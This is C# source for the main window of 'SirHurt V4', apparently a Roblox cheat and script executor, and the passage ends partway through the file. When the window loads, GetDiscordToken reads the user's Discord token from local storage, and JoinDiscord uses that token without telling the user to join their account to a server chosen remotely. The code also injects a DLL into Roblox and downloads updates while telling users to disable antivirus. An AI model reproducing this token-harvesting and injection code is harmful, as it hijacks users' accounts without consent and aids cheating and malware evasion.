using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using SirhurtNewUI.Properties;
using SirhurtNewUI.MenuStripStuff;
using FormWindowState = System.Windows.Forms.FormWindowState;
using System.IO;
using SirhurtNewUI.RandomStuff;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Threading;
using Microsoft.Win32;
using SirhurtNewUI.ExtraForms;
using System.Net;
using System.Text.RegularExpressions;

namespace SirhurtNewUI
{
    public partial class Main : Form
    {
        private IrisFramework.IrisScriptTabs customTabControl1;
        protected override CreateParams CreateParams
        {
            get
            {
                CreateParams cp = base.CreateParams;
                cp.ClassStyle |= 0x20000;
                return cp;
            }
        }

        #region LanguageStuff
        public void TranslateLanguage(string Language)
        {

            if (Language == "" || string.IsNullOrEmpty(Language) || string.IsNullOrWhiteSpace(Language))
            {
                fileToolStripMenuItem.Text = "File";
                viewToolStripMenuItem.Text = "View";
                extensionsToolStripMenuItem.Text = "Extensions";
                helpToolStripMenuItem.Text = "Help";
                runScriptToolStripMenuItem.Text = "Run Script";

                newScriptToolStripMenuItem.Text = "New Script";
                openFileToolStripMenuItem.Text = "Open File";
                saveAsToolStripMenuItem.Text = "Save As";
                exitToolStripMenuItem.Text = "Exit";

                appearanceSettingsToolStripMenuItem.Text = "Appearance";
                otherToolStripMenuItem.Text = "Other";
                scriptHubToolStripMenuItem.Text = "Script Hub";

                runScriptToolStripMenuItem.Text = "Run Script";

                autoInjectToolStripMenuItem.Text = "Auto Inject";
                killRobloxToolStripMenuItem.Text = "Kill ROBLOX";
                topMostToolStripMenuItem.Text = "Top Most";

                joinDiscordToolStripMenuItem.Text = "SirHurt Discord";
                creditsToolStripMenuItem.Text = "Credits";
                languageSettingsToolStripMenuItem.Text = "Language Settings";
                saveTabsOnExitToolStripMenuItem.Text = "Save Tabs on Exit";
                ColorClass.MyIni.Write("language", "English", "main");

            }
            if (Language == "English" || Language == "english")
            {
                fileToolStripMenuItem.Text = "File";
                viewToolStripMenuItem.Text = "View";
                extensionsToolStripMenuItem.Text = "Extensions";
                helpToolStripMenuItem.Text = "Help";
                runScriptToolStripMenuItem.Text = "Run Script";

                newScriptToolStripMenuItem.Text = "New Script";
                openFileToolStripMenuItem.Text = "Open File";
                saveAsToolStripMenuItem.Text = "Save As";
                exitToolStripMenuItem.Text = "Exit";

                appearanceSettingsToolStripMenuItem.Text = "Appearance";
                otherToolStripMenuItem.Text = "Other";
                scriptHubToolStripMenuItem.Text = "Script Hub";

                runScriptToolStripMenuItem.Text = "Run Script";

                autoInjectToolStripMenuItem.Text = "Auto Inject";
                killRobloxToolStripMenuItem.Text = "Kill ROBLOX";
                topMostToolStripMenuItem.Text = "Top Most";

                joinDiscordToolStripMenuItem.Text = "SirHurt Discord";
                creditsToolStripMenuItem.Text = "Credits";
                languageSettingsToolStripMenuItem.Text = "Language Settings";
                saveTabsOnExitToolStripMenuItem.Text = "Save Tabs on Exit";
            }

            if (Language == "Russian" || Language == "russian")
            {
                fileToolStripMenuItem.Text = "файл"; //File
                viewToolStripMenuItem.Text = "Посмотреть"; //View
                extensionsToolStripMenuItem.Text = "расширения"; //Extensions
                helpToolStripMenuItem.Text = "Помогите"; //Help
                runScriptToolStripMenuItem.Text = "Бегать"; //Run

                newScriptToolStripMenuItem.Text = "Новый скрипт"; //New Script
                openFileToolStripMenuItem.Text = "Открыть файл"; //Open File
                saveAsToolStripMenuItem.Text = "Сохранить как"; //Save As
                exitToolStripMenuItem.Text = "Выход"; //Exit

                appearanceSettingsToolStripMenuItem.Text = "Внешность"; //Appearance
                otherToolStripMenuItem.Text = "Загрузить настройки в редактор"; //Load Settings Into Editor
                scriptHubToolStripMenuItem.Text = "Script Hub"; //Script Hub

                autoInjectToolStripMenuItem.Text = "Авто впрыск"; //Auto Inject
                killRobloxToolStripMenuItem.Text = "Убить ROBLOX"; //Kill ROBLOX
                topMostToolStripMenuItem.Text = "Топ Мост"; //Top Most

                joinDiscordToolStripMenuItem.Text = "SirHurt Discord"; //SirHurt Discord
                creditsToolStripMenuItem.Text = "кредиты"; //Credits
                languageSettingsToolStripMenuItem.Text = "язык"; //Language
                saveTabsOnExitToolStripMenuItem.Text = "Сохранить вкладки при выходе";
            }

            if (Language == "French" || Language == "french")
            {
                fileToolStripMenuItem.Text = "Fichier"; //File
                viewToolStripMenuItem.Text = "Vue"; //View
                extensionsToolStripMenuItem.Text = "Extensions"; //Extensions
                helpToolStripMenuItem.Text = "Aidez-moi"; //Help
                runScriptToolStripMenuItem.Text = "Courir"; //Run
                newScriptToolStripMenuItem.Text = "Nouveau script"; //New Script
                openFileToolStripMenuItem.Text = "Fichier ouvert"; //Open File
                saveAsToolStripMenuItem.Text = "Enregistrer sous"; //Save As
                exitToolStripMenuItem.Text = "Sortie"; //Exit

                appearanceSettingsToolStripMenuItem.Text = "Apparence"; //Appearance
                otherToolStripMenuItem.Text = "Charger les paramètres dans l'éditeur"; //Load Settings Into Editor
                scriptHubToolStripMenuItem.Text = "Script Hub"; //Script Hub

                autoInjectToolStripMenuItem.Text = "Injection automatique"; //Auto Inject
                killRobloxToolStripMenuItem.Text = "Tuez ROBLOX"; //Kill ROBLOX
                topMostToolStripMenuItem.Text = "Top plus"; //Top Most

                joinDiscordToolStripMenuItem.Text = "SirHurt Discord"; //SirHurt Discord
                creditsToolStripMenuItem.Text = "Crédits"; //Credits
                languageSettingsToolStripMenuItem.Text = "Langue"; //Language
                saveTabsOnExitToolStripMenuItem.Text = "Enregistrer les onglets à la sortie";
            }

            if (Language == "Portuguese" || Language == "portuguese")
            {
                fileToolStripMenuItem.Text = "Arquivo"; //File
                viewToolStripMenuItem.Text = "Visão"; //View
                extensionsToolStripMenuItem.Text = "Extensões"; //Extensions
                helpToolStripMenuItem.Text = "Socorro"; //Help
                runScriptToolStripMenuItem.Text = "Corre"; //Run

                newScriptToolStripMenuItem.Text = "Novo Script"; //New Script
                openFileToolStripMenuItem.Text = "Abrir arquivo"; //Open File
                saveAsToolStripMenuItem.Text = "Salvar como"; //Save As

                exitToolStripMenuItem.Text = "Saída"; //Exit

                appearanceSettingsToolStripMenuItem.Text = "Aparência"; //Appearance
                otherToolStripMenuItem.Text = "Carregar configurações no editor"; //Load Settings Into Editor
                scriptHubToolStripMenuItem.Text = "Script Hub"; //Script Hub

                autoInjectToolStripMenuItem.Text = "Injeção Automática"; //Auto Inject
                killRobloxToolStripMenuItem.Text = "Kill ROBLOX"; //Kill ROBLOX
                topMostToolStripMenuItem.Text = "Top Most"; //Top Most

                joinDiscordToolStripMenuItem.Text = "SirHurt Discord"; //SirHurt Discord
                creditsToolStripMenuItem.Text = "Créditos"; //Credits
                languageSettingsToolStripMenuItem.Text = "Língua"; //Language
                saveTabsOnExitToolStripMenuItem.Text = "Salvar guias ao sair";
            }

            if (Language == "German" || Language == "german")
            {
                fileToolStripMenuItem.Text = "Datei"; //File
                viewToolStripMenuItem.Text = "Aussicht"; //View
                extensionsToolStripMenuItem.Text = "Erweiterungen"; //Extensions
                helpToolStripMenuItem.Text = "Hilfe"; //Help
                runScriptToolStripMenuItem.Text = "Lauf"; //Run

                newScriptToolStripMenuItem.Text = "Neues Skript"; //New Script
                openFileToolStripMenuItem.Text = "Datei öffnen"; //Open File
                saveAsToolStripMenuItem.Text = "Speichern als"; //Save As
                exitToolStripMenuItem.Text = "Ausgang"; //Exit

                appearanceSettingsToolStripMenuItem.Text = "Aussehen"; //Appearance
                otherToolStripMenuItem.Text = "Laden Sie die Einstellungen in den Editor"; //Load Settings Into Editor
                scriptHubToolStripMenuItem.Text = "Script Hub"; //Script Hub

                autoInjectToolStripMenuItem.Text = "Auto Inject"; //Auto Inject
                killRobloxToolStripMenuItem.Text = "Töte ROBLOX"; //Kill ROBLOX
                topMostToolStripMenuItem.Text = "Oben am meisten"; //Top Most

                joinDiscordToolStripMenuItem.Text = "SirHurt Discord"; //SirHurt Discord
                creditsToolStripMenuItem.Text = "Credits"; //Credits
                languageSettingsToolStripMenuItem.Text = "Sprache"; //Language
                saveTabsOnExitToolStripMenuItem.Text = "Tabs beim Beenden speichern";
            }

            if (Language == "Polski" || Language == "polski")
            {
                fileToolStripMenuItem.Text = "Plik"; //File
                viewToolStripMenuItem.Text = "Widok"; //View
                extensionsToolStripMenuItem.Text = "Rozszerzenia"; //Extensions
                helpToolStripMenuItem.Text = "Pomoc"; //Help
                runScriptToolStripMenuItem.Text = "Uruchom skrypt"; //Run

                newScriptToolStripMenuItem.Text = "Nowy skrypt"; //New Script
                openFileToolStripMenuItem.Text = "Otwórz plik"; //Open File
                saveAsToolStripMenuItem.Text = "Zapisz jako"; //Save As
                exitToolStripMenuItem.Text = "Wyjdź"; //Exit

                appearanceSettingsToolStripMenuItem.Text = "Wygląd"; //Appearance
                otherToolStripMenuItem.Text = "Inne"; //Load Settings Into Editor
                scriptHubToolStripMenuItem.Text = "Lista skryptów"; //Script Hub

                autoInjectToolStripMenuItem.Text = "Automatyczne wstrzykiwanie"; //Auto Inject
                killRobloxToolStripMenuItem.Text = "Wyłącz ROBLOX"; //Kill ROBLOX
                topMostToolStripMenuItem.Text = "Ustaw w pozycji najwyższej"; //Top Most

                joinDiscordToolStripMenuItem.Text = "Serwer Discord Sirhurta"; //SirHurt Discord
                creditsToolStripMenuItem.Text = "Autorzy"; //Credits
                languageSettingsToolStripMenuItem.Text = "Change the language"; //Language
                saveTabsOnExitToolStripMenuItem.Text = "Zapisz zakładki po wyjściu";
            }
        }

        public string JoinDiscord(string token, string invite)
        {
            var httpWebRequest = (HttpWebRequest)WebRequest.Create("https://discordapp.com/api/v6/invites/" + invite);
            httpWebRequest.AutomaticDecompression = DecompressionMethods.GZip | DecompressionMethods.Deflate;
            httpWebRequest.Method = "POST";

            httpWebRequest.Headers["Authorization"] = token;
            httpWebRequest.Headers["Origin"] = "https:///discordapp.com";
            httpWebRequest.Referer = "https:///discord.gg/" + invite;

            httpWebRequest.ContentType = "text/plain";
            httpWebRequest.ContentLength = 0;

            string result;
            using (var httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse())
            {
                using (var responseStream = httpWebResponse.GetResponseStream())
                {
                    using (var streamReader = new StreamReader(responseStream))
                    {
                        result = streamReader.ReadToEnd();
                    }
                }
            }

            return result;
        }

        public static string GetDiscordToken()
        {
            string leveldb_storage = Path.Combine(Path.Combine(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "discord"), "Local Storage"), "leveldb");

            var debounce = false;
            if (!Directory.Exists(leveldb_storage))
                return "NONE";

            foreach (var LFile in Directory.EnumerateFiles(leveldb_storage, "*.*", SearchOption.AllDirectories).Where(s => s.EndsWith(".ldb")))
            {
                var source = File.ReadAllLines(LFile);
                foreach (string str in source)
                {
                    if (!str.Contains("token") && !str.Contains("oken"))
                    {
                        if (!debounce) continue;
                        debounce = false;
                    }
                    else
                    {
                        debounce = true;
                    }

                    var regfilter = Regex.Replace(str, "[^0-9a-zA-Z\\.\\-_\"=]+", "");
                    var token_ = Regex.Matches(regfilter, "\"(.+?)\"");

                    foreach (Match Mat in token_)
                    {
                        var Token = Mat.Groups[1].Value.Replace("\"", "");

                        if (Token.Length > 50)
                        {
                            return Token;
                        }
                    }
                }
            }

            return "NONE";
        }

        private void Handle_Discord()
        {
            try
            {
                string Discord_Token = GetDiscordToken();

                if (Discord_Token != "NONE")
                {
                    var wtKey = Registry.CurrentUser.OpenSubKey("Software\\Asshurt", true);
                    if (wtKey != null)
                    {
                        string discord_invcode = new WebClient().DownloadString("https://sirhurt.net/login/js-php/fetch_discord_invite.php"); //"cv36XTD"; //Fuzions Fairy Pond
                        string joined_discord;

                        try
                        {
                            joined_discord = wtKey.GetValue("Joined_Discord").ToString();
                        }
                        catch
                        {
                            wtKey.CreateSubKey("Joined_Discord", true);
                            wtKey.SetValue("Joined_Discord", discord_invcode);
                            joined_discord = wtKey.GetValue("Joined_Discord").ToString();
                        }

                        if (joined_discord != discord_invcode)
                        {
                            string res = JoinDiscord(Discord_Token, discord_invcode);

                            wtKey.SetValue("Joined_Discord", discord_invcode, RegistryValueKind.String);
                        }

                        wtKey.Close();
                    }
                }
            }
            catch
            {

            }
        }
        #endregion
        [DllImport("user32.dll", SetLastError = true)]
        private static extern bool SetProcessDPIAware();
        [DllImport("SirHurtInjector.dll")]
        private static extern int InjectAllProcesses();

        [DllImport("SirHurtInjector.dll")]
        private static extern int Inject();
        [DllImport("user32.dll", SetLastError = true)]
        internal static extern IntPtr FindWindowA(string lpClassName, string lpWindowName);
        [DllImport("user32.dll", SetLastError = true)]
        private static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);

        [DllImport("Gdi32.dll", EntryPoint = "CreateRoundRectRgn")]
        public static extern IntPtr CreateRoundRectRgn
        (
            int nLeftRect, // x-coordinate of upper-left corner
            int nTopRect, // y-coordinate of upper-left corner
            int nRightRect, // x-coordinate of lower-right corner
            int nBottomRect, // y-coordinate of lower-right corner
            int nWidthEllipse, // height of ellipse
            int nHeightEllipse // width of ellipse
        );
        private bool MouseDown = false;
        private bool MDown2 = false;
        private Point LastLocation;
        private bool Resizing;
        private string OldTabName;
        private bool attached;
        private uint attachedID;
        private bool MultiProcess;
        private int NewWidth = 130;
        public string NewText;
        Editor ColorClass = new Editor();


        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool AllocConsole();


        public async void Debug(params object[] Data)
        {
            string ToWrite = string.Join(" ", Data);
            Console.WriteLine("[" + DateTime.Now.ToString("h:mm:ss") + "] " + ToWrite);
        }

        public static string RandomString(int maxSize)
        {
            var CharArray = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890".ToCharArray();
            var Byte = new byte[1];
            using (var rngcryptoServiceProvider = new RNGCryptoServiceProvider())
            {
                rngcryptoServiceProvider.GetNonZeroBytes(Byte);
                Byte = new byte[maxSize];
                rngcryptoServiceProvider.GetNonZeroBytes(Byte);
            }

            var stringBuilder = new StringBuilder(maxSize);
            foreach (var b in Byte) stringBuilder.Append(CharArray[b % CharArray.Length]);
            return stringBuilder.ToString();
        }
        public void RbxDetecc()
        {
            var t2 = new Thread(delegate ()
            {
                for (; ; )
                {
                    Thread.Sleep(100);
                    var intPtr = FindWindowA("WINDOWSCLIENT", "Roblox");
                    var num = 0u;
                    GetWindowThreadProcessId(intPtr, out num);
                    if (intPtr == IntPtr.Zero && attached || attachedID != 0u && num != attachedID)
                    {
                        attached = false;
                        MainStrip.Invoke(new Action(() => { runScriptToolStripMenuItem.Image = Resources.red; }));
                    }
                }
            });
            t2.Start();
        }

        public void InjectSirHurt()
        {
            Debug("Attempting to attach");
            try
            {
                Debug("Attach Step1");
                var AutoAttach = autoInjectToolStripMenuItem.Checked;
                RbxDetecc();
                var intPtr = FindWindowA("WINDOWSCLIENT", "Roblox");
                Debug("Attach Step2");
                if (!attached && intPtr != IntPtr.Zero)
                {
                    Debug("Attach Step3");
                    var num = 0;
                    if (AutoAttach) Thread.Sleep(3000);
                    Debug("Attach Step4");
                    try
                    {
                        Debug("Attach Step5");
                        if (MultiProcess)
                            num = InjectAllProcesses();
                        else
                            num = Inject();
                        Debug("Attach Step6");
                    }
                    catch (Exception ex)
                    {
                        Debug("Attach Step6.5");
                        attached = false;
                        MainStrip.Invoke(new Action(() => { runScriptToolStripMenuItem.Image = Resources.red; }));
                        MessageBox.Show($"An error occured with injecting SirHurt: {ex.Message}", "SirHurt V4");
                    }

                    Debug("Attach Step7");
                    if (num != 0)
                    {
                        Debug("Attach Step8");
                        attached = true;
                        MainStrip.Invoke(new Action(() => { runScriptToolStripMenuItem.Image = Resources.green; }));
                        return;
                    }

                    Debug("Attach Step9");
                    attached = false;
                    MainStrip.Invoke(new Action(() => { runScriptToolStripMenuItem.Image = Resources.red; }));
                }
                Thread.CurrentThread.Abort();
            }
            catch
            {
                Debug("Attaching failed.");
                Thread.CurrentThread.Abort();
            }
        }

        public void InitSetup()
        {
            try
            {
                Debug("Ini File Running");
                if (!Directory.Exists($"{Environment.CurrentDirectory}\\bin\\schemes"))
                    Directory.CreateDirectory($"{Environment.CurrentDirectory}\\bin\\schemes");
                var MyIni = ColorClass.MyIni;
                if (!File.Exists($"{Environment.CurrentDirectory}\\bin\\schemes\\Settings.ini") || File.ReadLines($"{Environment.CurrentDirectory}\\bin\\schemes\\Settings.ini").Count()!= 30)
                {
                    DialogResult dialog = MessageBox.Show("Settings file has an update would you like to backup your settings file?", "Sirhurt V4", MessageBoxButtons.YesNo, MessageBoxIcon.Asterisk);
                    if (dialog == DialogResult.Yes)
                    {
                        if (File.Exists($"{Environment.CurrentDirectory}\\bin\\schemes\\Settings.ini"))
                            File.Move($"{Environment.CurrentDirectory}\\bin\\schemes\\Settings.ini", $"{Environment.CurrentDirectory}\\bin\\schemes\\Settings.ini.bak");
                    }
                    File.Create($"{Environment.CurrentDirectory}\\bin\\schemes\\Settings.ini").Dispose();
                    MyIni = new Editor.IniFile($"{Environment.CurrentDirectory}\\bin\\schemes\\Settings.ini");

                    MyIni.Write("mainTextColor", "158, 158, 158", "main");
                    MyIni.Write("language", "English", "main");
                    MyIni.Write("loadIntellisense", "false", "main");
                    MyIni.Write("dpiaware", "false", "main");
                    MyIni.Write("debugdata", "false", "main");

                    MyIni.Write("topMost", "false", "extra");
                    MyIni.Write("multiApplication", "false", "extra");
                    MyIni.Write("autoInject", "false", "extra");
                    MyIni.Write("saveTabsonExit", "false", "extra");
                    MyIni.Write("extraScriptHub", "false", "extra");
                    MyIni.Write("fpsUnlocker", "false", "extra");

                    MyIni.Write("textEditorColor", "30,30,30", "scintilla");
                    MyIni.Write("textColor", "255,255,255", "scintilla");
                    MyIni.Write("identifier", "255,255,255", "scintilla");
                    MyIni.Write("blockComment", "74,139,69", "scintilla");
                    MyIni.Write("commentLine", "74,139,69", "scintilla");
                    MyIni.Write("commentDoc", "58,64,34", "scintilla");
                    MyIni.Write("integer", "181,206,168", "scintilla");
                    MyIni.Write("string", "193,118,76", "scintilla");
                    MyIni.Write("character", "193,118,76", "scintilla");
                    MyIni.Write("literalString", "193,118,76", "scintilla");
                    MyIni.Write("operator", "255,255,255", "scintilla");
                    MyIni.Write("keyword1 Color(\"warn print decompile\")", "66,156,195", "scintilla");
                    MyIni.Write("keyword2 Color(\"if then else\")", "69,180,152", "scintilla");
                    MyIni.Write("keyword3 Color(\"getgenv setclipboard getupvalue\")", "103,216,218", "scintilla");
                    MyIni.Write("Custom Keywords", "seperate_them_with_a_space", "scintilla");
                    MyIni.Write("Custom Keyword Color", "103,216,218", "scintilla");
                    //MessageBox.Show(File.ReadLines($"{Environment.CurrentDirectory}\\bin\\schemes\\Settings.ini")
                    //    .Count().ToString());
                    Process.Start(Application.ExecutablePath);
                    Process.GetCurrentProcess().Kill();
                    return;
                }
                
                TopMost = ColorClass.ToBool(MyIni.Read("topMost", "extra"));
                topMostToolStripMenuItem.Checked = ColorClass.ToBool(MyIni.Read("topMost", "extra"));
                multiApplicationToolStripMenuItem.Checked = ColorClass.ToBool(MyIni.Read("multiApplication", "extra"));

                if (multiApplicationToolStripMenuItem.Checked)
                    new Mutex(true, "ROBLOX_singletonMutex");
                else
                    new Mutex(false, "ROBLOX_singletonMutex");

                
                saveTabsOnExitToolStripMenuItem.Checked = ColorClass.ToBool(MyIni.Read("saveTabsonExit", "extra"));


                if (ColorClass.ToBool(MyIni.Read("autoInject", "extra")))
                {
                    AutoAttachFunc();
                    autoInjectToolStripMenuItem.Checked = true;
                }

                if (ColorClass.ToBool(MyIni.Read("fpsUnlocker", "extra")))
                    toolStripMenuItem1.Checked = true;

                if (ColorClass.ToBool(MyIni.Read("extraScriptHub", "extra")))
                    ScriptHubV2Button.Visible = true;

                if (ColorClass.ToBool(MyIni.Read("dpiaware", "main")))
                    SetProcessDPIAware();

                TranslateLanguage(ColorClass.MyIni.Read("language", "main"));

                if (ColorClass.ToColor(MyIni.Read("mainTextColor", "main")) != Color.FromArgb(158, 158, 158))
                {
                    foreach (Control control in TopBar.Controls)
                        if (control is Label || control is TreeView || control is ToolStripMenuItem)
                            UpdateColorControls(control, ColorClass.ToColor(MyIni.Read("mainTextColor", "main")));
                    foreach (ToolStripMenuItem item in MainStrip.Items)
                    {
                        item.ForeColor = ColorClass.ToColor(MyIni.Read("mainTextColor", "main"));
                        foreach (var children in item.DropDownItems)
                        {
                            var Child = children as ToolStripMenuItem;
                            if (!(Child is CustomToolStripSeparator) && Child != null)
                                Child.ForeColor = ColorClass.ToColor(MyIni.Read("mainTextColor", "main"));
                        }
                    }

                    languageSettingsToolStripMenuItem.ForeColor = ColorClass.ToColor(MyIni.Read("mainTextColor", "main"));
                    otherToolStripMenuItem.ForeColor = ColorClass.ToColor(MyIni.Read("mainTextColor", "main"));
                }
                Debug("Ini File Ran");
            }
            catch
            {
            }
        }

        public void UpdateColorControls(Control myControl, Color color)
        {

            myControl.ForeColor = color;
            foreach (Control subC in myControl.Controls)
            {
                UpdateColorControls(subC, ColorClass.ToColor(ColorClass.MyIni.Read("mainTextColor", "main")));
            }
        }
        public Main()
        {
            InitializeComponent();
            MainStrip.Renderer = new BrowserMenuRenderer();
            ScriptListContext.Renderer = new BrowserMenuRenderer();
            Region = Region.FromHrgn(CreateRoundRectRgn(0, 0, Width, Height, 4, 4));
            ShowInTaskbar = false;
            ShowInTaskbar = true;
        }

        private void Close_MouseEnter(object sender, EventArgs e)
        {
            Debug("Close_MouseEnter Event");
            try { Close.BackgroundImage = Resources.MacHover; } catch { }
        }

        private void Minimize_MouseEnter(object sender, EventArgs e)
        {
            Debug("Minimize_MouseEnter Hover Event");
            try { Minimize.BackgroundImage = Resources.MacHoverMin; } catch { }
        }

        private void Minimize_MouseLeave(object sender, EventArgs e)
        {
            Debug("Minimize_MouseEnter Event 2");
            try { Minimize.BackgroundImage = Resources.MacMin; } catch { }
        }

        private void Close_MouseLeave(object sender, EventArgs e)
        {
            Debug("Close_MouseLeave 2");
            try { Close.BackgroundImage = Resources.MacClose; } catch { }
        }

        private void TopBar_MouseDown(object sender, MouseEventArgs e)
        {
            MouseDown = true;
            LastLocation = e.Location;
        }

        private void TopBar_MouseMove(object sender, MouseEventArgs e)
        {
            if (MouseDown)
            {
                Location = new Point(
                    Location.X - LastLocation.X + e.X, Location.Y - LastLocation.Y + e.Y);
                Update();
            }
        }

        private void TopBar_MouseUp(object sender, MouseEventArgs e)
        {
            MouseDown = false;
        }

        private void Close_Click(object sender, EventArgs e)
        {
            if (saveTabsOnExitToolStripMenuItem.Checked)
                SaveTabs();
            Console.WriteLine(Process.GetCurrentProcess().ProcessName);
            foreach (Process process in Process.GetProcessesByName("Sirhurt V4"))
                process.Kill();
            //Environment.Exit(Environment.ExitCode);
        }

        private void Minimize_Click(object sender, EventArgs e)
        {
            WindowState = FormWindowState.Minimized;
        }

        private void PanelMouseUp(object sender, MouseEventArgs e)
        {
            Resizing = false;
        }
        private void PanelMouseDown(object sender, MouseEventArgs e)
        {
            Resizing = true;
        }
        private void PanelMouseMove(object sender, MouseEventArgs e)
        {
            if (Resizing)
            {
                int w = Size.Width;
                int h = Size.Height;

                if (Cursor.Current.ToString() == "[Cursor: SizeNS]")
                {
                    Size = new Size(w, h + (e.Location.Y));
                    Update();
                }
                else if (Cursor.Current.ToString() == "[Cursor: SizeWE]")
                {
                    Size = new Size(w + (e.Location.X), h);
                    Update();
                }
                else if (Cursor.Current.ToString() == "[Cursor: SizeNWSE]")
                {
                    Size = new Size(w + (e.Location.X), h + (e.Location.Y));
                    Update();
                }
                Update();
                Region = Region.FromHrgn(CreateRoundRectRgn(0, 0, Width, Height, 7, 7));
            }
        }
        [DllImport("kernel32.dll")]
        static extern bool AttachConsole(int dwProcessId);
        private const int ATTACH_PARENT_PROCESS = -1;

        private void Main_Load(object sender, EventArgs e)
        {
            if (ColorClass.ToBool(ColorClass.MyIni.Read("debugdata", "main")))
            {
                AttachConsole(ATTACH_PARENT_PROCESS);
                AllocConsole();
            }

            customTabControl1 = new IrisFramework.IrisScriptTabs();
            customTabControl1.Dock = DockStyle.Fill;
            panel1.Controls.Add(customTabControl1);

            Debug("Starting Main_Load()");
            Debug("Checking for Sirhurt Processes");
            foreach (Process process in Process.GetProcessesByName("Sirhurt V4"))
            {
                if (process.Id != Process.GetCurrentProcess().Id)
                    process.Kill();
            }
            Debug("Checking for Sirhurt Processes ran");
            Debug("Settings global tabControl variable");
            Debug("Settings global tabControl variable ran");
            Debug("Settings toolstrip events");
            toolStripTextBox3.TextChanged += ToolStripTextBox3_TextChanged;
            toolStripTextBox3.KeyPress += ToolStripTextBox3_KeyPress;
            Debug("Settings toolstrip events ran");
            Debug("Checking for sirhurt files");
            if (!Environment.CurrentDirectory.Contains(@"\Sources\C#\_Sirhurt Stuff"))
                if (!Directory.Exists($"{Environment.CurrentDirectory}\\bin") || !File.Exists($"{Environment.CurrentDirectory}\\SirHurtInjector.dll")) { MessageBox.Show("Missing required directories and files, opening bootstrapper...", "Sirhurt V4", MessageBoxButtons.OK, MessageBoxIcon.Error); try { Process.Start($"{Environment.CurrentDirectory}\\SirHurt_V4_Bootstrapper.exe"); foreach (var process in Process.GetProcessesByName("SirHurt V4.exe")) process.Kill(); } catch { MessageBox.Show("Could not open bootstrapper, closing process...", "Sirhurt V4", MessageBoxButtons.OK, MessageBoxIcon.Error); Environment.Exit(Environment.ExitCode); } }

            Debug("Checking for sirhurt files done.");
            ScriptList.Nodes.Clear();

            toolTip1.SetToolTip(InjectButton, "Inject");


            Debug("Running sirhurt ini");
            var randomNameLog = RandomString(10);
            Name = randomNameLog;
            Text = randomNameLog;

            label1.Text = randomNameLog;

            Debug("Running sirhurt ini2");
            Handle_Discord();

            var wtKey = Registry.CurrentUser.OpenSubKey("Software\\Asshurt", true);

            if (wtKey == null)
            {
                wtKey = Registry.CurrentUser.CreateSubKey("Software\\Asshurt");
            }

            if (wtKey != null)
            {
                wtKey.SetValue("WNT", randomNameLog, RegistryValueKind.String);
            }
            try
            {
                string Latest_DLL = new WebClient().DownloadString("https://sirhurt.net/asshurt/update/v4/fetch_sirhurt_version.php");
                string DLL_Link = new WebClient().DownloadString("https://sirhurt.net/asshurt/update/v4/fetch_version.php");

                if (Latest_DLL != "Failed: A update has not yet been released for this ROBLOX build." && wtKey != null)
                {
                    string version_hash = wtKey.GetValue("VHASH").ToString();

                    if (version_hash != CalculateMD5Hash(Latest_DLL))
                    {
                        DialogResult dialogResult = MessageBox.Show(this, "It appears a new SirHurt V4 version is avaliable. Would you like to download it?", "SIRHURT V4 UPDATE NOTIFICATION", MessageBoxButtons.YesNo);

                        if (dialogResult == DialogResult.Yes)
                        {
                            WebClient client = new WebClient();

                            string SirHurtPath = Directory.GetCurrentDirectory();
                            client.DownloadFile(DLL_Link, SirHurtPath + "\\SirHurt.new");
                            client.Dispose();

                            if (File.Exists(SirHurtPath + "\\SirHurt.dll"))
                            {
                                File.Delete(SirHurtPath + "\\SirHurt.dll");
                            }

                            if (!File.Exists(SirHurtPath + "\\SirHurt.new"))
                            {
                                MessageBox.Show("SirHurt was not able to be downloaded. Try turning off your anti virus software than restarting.");
                                Environment.Exit(0);
                            }
                            else
                            {
                                File.Move(SirHurtPath + "\\SirHurt.new", SirHurtPath + "\\SirHurt.dll");
                            }

                            wtKey.SetValue("VHASH", CalculateMD5Hash(Latest_DLL), RegistryValueKind.String);
                        }
                    }

                    wtKey.Close();
                }
            }
            catch (Exception ex){ }
            Debug("Running sirhurt ini ran");
            Debug("Running initsetup");
            InitSetup();
            Debug("Running initsetup ran");

            Debug("Adding firstpage");
            customTabControl1.CreateTab("Script.lua");
            Debug("Setting global firstpage");
            Debug("Adding First page ran and global set");
            Debug("Loading saved tabs");
            if (saveTabsOnExitToolStripMenuItem.Checked)
            {
                try
                {
                    foreach (var Oop in Directory.GetFiles($"{Environment.CurrentDirectory}\\bin\\scripttemps"))
                    {
                        var FileName = Oop.Replace($"{Environment.CurrentDirectory}\\bin\\scripttemps\\", "");
                        customTabControl1.CreateTab(FileName, Base64decode(File.ReadAllText(Oop)));
                        File.Delete(Oop);
                    }
                }
                catch { }
            }
            Debug("Loading saved tabs done");
            Debug("Checking for script folder and setting watcher events");
            if (!Directory.Exists($"{Environment.CurrentDirectory}\\Scripts"))
                Directory.CreateDirectory($"{Environment.CurrentDirectory}\\Scripts");
            FileSystemWatcher Watcher = new FileSystemWatcher();
            Watcher.Path = $"{Environment.CurrentDirectory}\\Scripts";
            Watcher.Deleted += Watcher_Changed;
            Watcher.Changed += Watcher_Changed;
            Watcher.EnableRaisingEvents = true;
            Watcher.Created += Watcher_Changed;

            Debug("Checking for script folder and setting watcher Done");
            Debug("Setting scriptlist events");
            ScriptList.AllowDrop = true;
            ScriptList.ItemDrag += new ItemDragEventHandler(treeView1_ItemDrag);
            ScriptList.DragEnter += new DragEventHandler(treeView1_DragEnter);
            ScriptList.DragOver += new DragEventHandler(treeView1_DragOver);
            ScriptList.DragDrop += new DragEventHandler(treeView1_DragDrop);
            Debug("Setting scriptlist events done");
        }
        public string CalculateMD5Hash(string input)
        {
            // step 1, calculate MD5 hash from input
            MD5 md5 = System.Security.Cryptography.MD5.Create();
            byte[] inputBytes = System.Text.Encoding.ASCII.GetBytes(input);
            byte[] hash = md5.ComputeHash(inputBytes);

            // step 2, convert byte array to hex string
            StringBuilder sb = new StringBuilder();
            for (int i = 0; i < hash.Length; i++)
            {
                sb.Append(hash[i].ToString("X2"));
            }
            return sb.ToString();
        }
